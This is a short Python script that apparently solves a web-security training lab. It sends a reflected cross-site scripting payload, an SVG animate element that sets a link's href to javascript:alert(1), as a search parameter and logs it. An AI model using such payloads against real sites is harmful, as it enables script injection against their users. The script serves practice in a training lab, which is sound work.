from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<svg><a><text x=20 y=20>Click me</text><animate attributeName=href values=javascript:alert(1) /><a/><svg/>"
    session.get_path("/", params={"search": xss})
    logger.info("Searched the following payload:")
    logger.info(xss)
